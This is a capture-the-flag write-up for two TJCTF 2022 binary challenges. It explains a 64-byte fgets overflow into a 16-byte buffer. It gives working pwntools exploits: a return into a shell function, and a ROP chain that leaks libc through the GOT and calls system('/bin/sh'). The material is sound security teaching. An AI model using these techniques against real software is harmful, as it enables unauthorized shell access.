# TJCTF 2022: pwn/vacation-1 and pwn/vacation-2

Participant: Robert Obkircher

## TL;DR / Short Summary

In the challenge `pwn/vacation-1` there is an obvious buffer overflow that can be used to return into a function `shell_land` which calls `system("/bin/sh")`.

The second challenge `pwn/vacation-2` is almost identical, but without `shell_land`. The solution is to
use return oriented programming to leak the address of libc and call `system("/bin/sh")`.

## Task Description

The task descriptions were very minimal. The files are in this repo.

> pwn/vacation1: 162 solves / 175 points
> 
> Too much school, too much work, too much writing CTF challenges... can I just go on vacation?
>
> `nc tjc.tf 31680`
> 
> Downloads: `Dockerfile`, `chall`, `chall.c`

> pwn/vacation2: 86 solves / 233 points
> 
> Travel agency said we can't go there anymore...
> 
> `nc tjc.tf 31705`
>
> Downloads: `Dockerfile`, `chall`, `chall.c`


## Analysis Steps

### Docker

The `Dockerfile` is identical for both challenges:

```dockerfile
FROM redpwn/jail:0.1.3

# ubuntu:focal-20220404
COPY --from=ubuntu@sha256:31cd7bbfd36421dfd338bceb36d803b3663c1bfa87dfe6af7ba764b5bf34de05 / /srv

# create bin/flag.txt with whatever inside
COPY bin/flag.txt /srv/app/
COPY bin/chall /srv/app/run
```

I couldn't run it so I created a docker container with the same version of ubuntu

```shell
docker run --rm -it -v$PWD:/foo ubuntu:focal-20220404
```

and some dependencies:

```shell
apt-get update
apt-get install vim gdb tmux python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential
python3 -m pip install --upgrade pip
python3 -m pip install --upgrade pwntools
```

For `pwn/vacation2` it was also necessary to have a copy of libc.
Initially I used the wrong file `/lib/libc.so.6` when I should have used `/srv/lib/x86_64-linux-gnu/libc-2.31.so`.
The script `vacation2/extract_docker.sh` can be used to get a copy of the file system:

```shell
docker build -t vacation2 .

rm -rf docker && mkdir docker && cd docker

C=$(docker container create vacation2:latest)
docker export -o x.tar $C
docker container rm $C

tar -xf x.tar && rm x.tar
```

### Source code

The only difference in the c files was that `shell_land` wasn't included for `pwn/vacation2`.

The function `vacation` contains a buffer overflow.
The call to `fgets(buf, 64, stdin)` writes up to 64 bytes into the 16 byte buffer `buf`.

```c
#include <stdio.h>
#include <stdlib.h>

void shell_land() {
  system("/bin/sh");
}

void vacation() {
  char buf[16];
  puts("Where am I going today?");
  fgets(buf, 64, stdin);
}

void main() {
  setbuf(stdout, NULL);
  vacation();
  puts("hmm... that doesn't sound very interesting...");
}
```

### Binary:

`pwntools` prints the same information for both binaries. Note that canaries are disabled and that the code is not position independent (No PIE).

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

#### vacation1

I used `cutter` to decompile the binaries. The relevant functions are `shell_land` and `vacation`.

The buffer overflow in `vacation`, which is explained [below](#vulnerabilities--exploitable-issues), allows us to set the return address to `0x0040119e` inside `shell_land`.

Initially I returend to `0x00401196`, but then the exploit only worked locally.
The reason was a segmentation fault, because `rsp` was not aligned to 16 bytes at function entry as specified by the System V ABI.
Skipping `push rbp` in `shell_land` resolved the issue.

```
shell_land ();
0x00401196      endbr64
0x0040119a      push rbp
0x0040119b      mov rbp, rsp
0x0040119e      lea rdi, str.bin_sh ; 0x402008 ; const char *string
0x004011a5      call system        ; sym.imp.system ; int system(const char *string)
0x004011aa      nop
0x004011ab      pop rbp
0x004011ac      ret
vacation ();
; var char *s @ rbp-0x10
0x004011ad      endbr64
0x004011b1      push rbp
0x004011b2      mov rbp, rsp
0x004011b5      sub rsp, 0x10
0x004011b9      lea rdi, str.Where_am_I_going_today ; 0x402010 ; const char *s
0x004011c0      call section..plt.sec ; sym.imp.puts ; int puts(const char *s)
0x004011c5      mov rdx, qword [stdin] ; obj.stdin__GLIBC_2.2.5
                                   ; 0x404060 ; FILE *stream
0x004011cc      lea rax, [s]
0x004011d0      mov esi, 0x40      ; '@' ; 64 ; int size
0x004011d5      mov rdi, rax       ; char *s
0x004011d8      call fgets         ; sym.imp.fgets ; char *fgets(char *s, int size, FILE *stream)
0x004011dd      nop
0x004011de      leave
0x004011df      ret
```

#### vacation2

In this case we don't have `shell_land`, so `main` becomes relevant, because it gives us two primitives for return oriented programming:

1. The call to `int puts(const char *s)` at `0x004011d6` can be used to read memory. The first argument `const char *s` is passed in the `rdi` register as specified by the System V ABI.
2. Returning to the start of main is a simple way to create a loop that reads and evaluates multiple payloads. This is necessary because the buffer can only fit ~5 return addresses.

The buffer overflow is the same as above, because `vacation` is identical except that it is located at a different offset.
```
vacation ();
; var char *s @ rbp-0x10
0x00401176      endbr64
0x0040117a      push    rbp
0x0040117b      mov     rbp, rsp
0x0040117e      sub     rsp, 0x10
0x00401182      lea     rdi, str.Where_am_I_going_today ; 0x402008 ; const char *s
0x00401189      call    section..plt.sec ; sym.imp.puts ; int puts(const char *s)
0x0040118e      mov     rdx, qword [stdin] ; obj.stdin__GLIBC_2.2.5
                                   ; 0x404050 ; FILE *stream
0x00401195      lea     rax, [s]
0x00401199      mov     esi, 0x40  ; '@' ; 64 ; int size
0x0040119e      mov     rdi, rax   ; char *s
0x004011a1      call    fgets      ; sym.imp.fgets ; char *fgets(char *s, int size, FILE *stream)
0x004011a6      nop
0x004011a7      leave
0x004011a8      ret
int main (int argc, char **argv, char **envp);
0x004011a9      endbr64
0x004011ad      push    rbp
0x004011ae      mov     rbp, rsp
0x004011b1      mov     rax, qword [stdout] ; obj.__TMC_END
                                   ; 0x404040
0x004011b8      mov     esi, 0     ; char *buf
0x004011bd      mov     rdi, rax   ; FILE *stream
0x004011c0      call    setbuf     ; sym.imp.setbuf ; void setbuf(FILE *stream, char *buf)
0x004011c5      mov     eax, 0
0x004011ca      call    vacation   ; sym.vacation
0x004011cf      lea     rdi, str.hmm..._that_doesn_t_sound_very_interesting... ; 0x402020 ; const char *s
0x004011d6      call    section..plt.sec ; sym.imp.puts ; int puts(const char *s)
0x004011db      nop
0x004011dc      pop     rbp
0x004011dd      ret
0x004011de      nop
```


## Vulnerabilities / Exploitable Issue(s)

```c
void vacation() {
  char buf[16];
  puts("Where am I going today?");
  fgets(buf, 64, stdin);
}
```

The vulnerability is that the function `vacation` contains a buffer overflow which allows us to overwrite the return address with data from stdin.
When it is called the following changes are made to the stack:

| instruction   | pushed value           | rsp change |
|---------------|------------------------|------------|
| call vacation | return address         | -8         |
| push rbp      | previous base pointer  | -8         |
| sub rsp, 0x10 | char buf[16]           | -16        |

The register `rsp` points to the top of the stack and its final value is the same as the start address of `buf`.

The stack grows toward smaller addresses but arrays indices grow toward larger addresses.
Thus `buf[16..24]` is the previous base pointer and `buf[24..32]` is the return address.

The statement `fgets(buf, 64, stdin);` allows us to override the return address of the current stack frame.
In addition, we can overwrite up to 4 additional return addresses (31 bytes and a 0) to chain multiple calls.

## Solution

### pwn/vacation1

The following script opens the binary with pwntools, 
connects to the remote and sends 
one line to override the return address 
and another one with a shell command to read the flag.

```python
from pwn import *

chall = ELF("bin/chall")
shell_land = chall.symbols["shell_land"]
assert shell_land == 0x00401196

# This is not required on my kali virtualbox vm.
# It is necessary on the remote and in a ubuntu:focal-20220404 docker container.
shell_land = 0x0040119e

with remote("tjc.tf", 31680) as p:
    print(p.recv())
    rbp = 0x0
    buffer = b"x" * 16 + p64(rbp) + p64(shell_land) + b"\n"
    p.send(buffer)
    pause(1)
    p.sendline(b"cat flag.txt")
    print(p.recv())
```

### pwn/vacation2

The original script in `vacation2/x.py` contains more comments and debug print statements.

This helper function sends up to 64 bytes.
It asserts that `fgets` will copy the full content into memory without modifications.

```python
def send_one_line(p, line):
    assert b"\n" not in line, line
    # The program reads at most 63 chars and adds a 0 at the end
    if len(line) < 63:
        p.sendline(line)
    elif len(line) == 63:
        p.send(line)
    elif len(line) == 64:
        assert line[63] == 0, line
        p.send(line[0:63])
    else:
        assert False, line
```

Next, the function `read_bytes_and_ret_to_main(pointer, length)` can be used to read a byte array from memory.

It uses the helper function `puts_addr_and_ret_to_main(addr)` to construct the rop chain.
First `rop(rdi = p64(addr))` places a char pointer `addr` on the stack and some address with the instructions `pop rdi; ret` to load it into the register.
Then we add `0x004011d6` and `0` to execute `puts; pop rbp; ret` at the end of main. 
Finally, we return to the beginning of `main` so that we can send another line.

Because `puts` stops at the null terminator we call it in a loop with different offsets until we have received at least the desired amount of bytes.

```python
def puts_addr_and_ret_to_main(addr):
    chall = context.binary
    rop = ROP(chall)

    rop(rdi = p64(addr))
    rop.raw(p64(0x004011d6))

    rop.raw(p64(0)) # for pop rbp at the end of main
    rop.raw(p64(chall.symbols["main"]))

    return bytes(rop)

def read_bytes_and_ret_to_main(pointer, length):
    value = b""
    for i in range(length):
        if i == len(value):
            send_one_line(p, b"x" * (16 + 8) + puts_addr_and_ret_to_main(pointer + i))
            data = p.recvuntil(b"\nWhere am I going today?\n", drop=True)
            value += data
            value += b"\0"
    return value[0:length]
```

Now that we can read arbitrary memory we can read the address of the libc function `puts` from the global offset table at `got.puts`.
This allows us to compute the address of libc, which is located at a random address because of address space layout randomization (ASLR).

After setting `libc.address`, `pwntools` automatically updates the location of all symbols.
We can then simply put a pointer to the string `"/bin/sh\x00"` into rdi and return to `system`.
To avoid segmentation faults we have to align the stack to 16 bytes by jumping directly to a `ret` instruction, which pops 8 bytes from the stack.
For some reason this wasn't necessary in my local virtual machine.

```python
context.binary = chall = ELF("bin/chall")

with remote("tjc.tf", 31705) as p:
    p.recvline() # Where am I going today?

    puts_ptr = u64(read_bytes_and_ret_to_main(chall.symbols["got.puts"], 8))

    libc = ELF("docker/srv/lib/x86_64-linux-gnu/libc-2.31.so")
    libc.address = puts_ptr - libc.symbols["puts"]
    assert libc.symbols["puts"] == puts_ptr

    rop = ROP(chall)
    rop(rdi = p64(next(libc.search(b"/bin/sh\x00"))))
    rop.raw(rop.find_gadget(["ret"]).address) # required in ubuntu docker to align the stack
    rop.raw(p64(libc.symbols["system"]))
    send_one_line(p, b"x" * (16 + 8) + bytes(rop))

    pause(1)
    p.sendline(b"cat flag.txt\n")
    print(p.recvall(timeout = 1))
```


## Failed Attempts

```python
None
```

## Alternative Solutions

I haven't looked at alternative solutions.

## Lessons Learned

This was the first time that I've used `pwntools`.
The biggest lesson that I've learned was that stack alignment is more important than I've thought.

## References

- ctftime tjctf: https://ctftime.org/event/1599
- pwntools: https://docs.pwntools.com/en/stable/
- cutter disassembler: https://github.com/rizinorg/cutter
- System V ABI: https://refspecs.linuxbase.org/elf/x86_64-abi-0.99.pdf
